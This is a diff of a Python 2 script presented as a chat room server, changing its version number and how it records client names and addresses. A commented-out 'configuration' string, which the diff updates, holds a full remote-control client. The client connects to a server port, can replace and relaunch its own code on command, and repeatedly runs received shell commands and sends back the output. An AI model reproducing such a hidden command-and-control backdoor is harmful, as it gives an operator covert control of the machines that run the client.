@@ -8,9 +8,9 @@ import sys
 import os
 from cmd import Cmd
 #Created by Camerin Figueroa
-cv = "1.0"
+cv = "1.1"
 q = Queue.Queue()
-q.put([])
+q.put([[]])
 errors = Queue.Queue()
 errors.put([])
 motd = Queue.Queue()
@@ -37,7 +37,7 @@ port = 99999
 configcont = "#Replace Everything behind = sign\n#Ex before: config = edit\n#Ex after: config = configinput\n\nmotd = Hello world This is a new Chat Room Server made by Camerin Figueroa\nport = 22550\n"
 if os.path.isfile('./crsconfig.txt') == True:
     f = open('./crsconfig.txt', 'r')
-    #configuration = 'import socket\nimport os\nimport time\nimport subprocess\nimport sys\ncv = "1.0"\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = (\'127.0.0.1\', 65021)\nsock.connect(server_address)\nrcv = sock.recv(128)\nsock.send(cv)\ncid = sock.recv(1024)\nif cid == "newver":\n    print "initiating update"\n    output = sock.recv(1024)\n    print output\n    if output == "tb:2":\n        print "tb2"\n        output1 = sock.recv(1024)\n        output2 = sock.recv(1024)\n        output = output1 + output2\n    elif output == "tb:3":\n        print "tb3"\n        output1 = sock.recv(1024)\n        output2 = sock.recv(1024)\n        output3 = sock.recv(1024)\n        output = output1 + output2 + output3\n    else:\n        print "tb1"\n        output = sock.recv(1024)\n    path = os.path.realpath(__file__)\n    f = open(path, \'w\')\n    f.write(output)\n    f.close()\n    os.system("python " + path + " &")\n    sys.exit()\nelse:\n    pass\nprint cid\nwhile True:\n    try:\n        sock.send("Ping")\n        data = sock.recv(1024)\n        cmd = data\n        print "Running " + cmd\n        if " " in data:\n            cmd.split(" ")\n            output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]\n        else:\n            output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]\n        sock.send(cid + ":" + output)\n    except:\n        pass\n    time.sleep(20)\nsock.close()\n'
+    #configuration = 'import socket\nimport os\nimport time\nimport subprocess\nimport sys\ncv = "1.1"\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = (\'127.0.0.1\', 65021)\nsock.connect(server_address)\nrcv = sock.recv(128)\nsock.send(cv)\ncid = sock.recv(1024)\nif cid == "newver":\n    print "initiating update"\n    output = sock.recv(1024)\n    print output\n    if output == "tb:2":\n        print "tb2"\n        output1 = sock.recv(1024)\n        output2 = sock.recv(1024)\n        output = output1 + output2\n    elif output == "tb:3":\n        print "tb3"\n        output1 = sock.recv(1024)\n        output2 = sock.recv(1024)\n        output3 = sock.recv(1024)\n        output = output1 + output2 + output3\n    else:\n        print "tb1"\n        output = sock.recv(1024)\n    path = os.path.realpath(__file__)\n    f = open(path, \'w\')\n    f.write(output)\n    f.close()\n    os.system("python " + path + " &")\n    sys.exit()\nelse:\n    pass\nprint cid\nwhile True:\n    try:\n        sock.send("Ping")\n        data = sock.recv(1024)\n        cmd = data\n        print "Running " + cmd\n        if " " in data:\n            cmd.split(" ")\n            output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]\n        else:\n            output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]\n        sock.send(cid + ":" + output)\n    except:\n        pass\n    time.sleep(20)\nsock.close()\n'
     configuration = f.read()
     f.close()
     configuration = configuration.split("\n")
@@ -77,9 +77,15 @@ class consoleprompt(Cmd):
         self.quit = quit
         db = q.get()
         q.put(db)
+        tick = 0
         for line in db:
             for lin in line:
-                print lin
+                if tick == 0:
+                    for li in lin:
+                        print li
+                    tick = 1
+                else:
+                    print lin
     def do_online(self, args):
         global online
         on = online.get()
@@ -213,17 +219,18 @@ class Server(object):
             if check == True:
                 db = q.get()
                 q.put(db)
-                leng = 0
-                for nam in db:
-                    if name == nam[0]:
+                leng = 1
+                for nam in db[0]:
+                    if name in nam:
                         nl = leng
                     else:
-                        leng = leng + 1
+                        leng = leng
                 if 'nl' in locals():
-                    pass
+                    db[0][nl - 1].append(address)
                 else:
                     nl = leng
                     db.append([name,])
+                    db[0].append([name, address])
                     q.get()
                     q.put(db)
                 try:
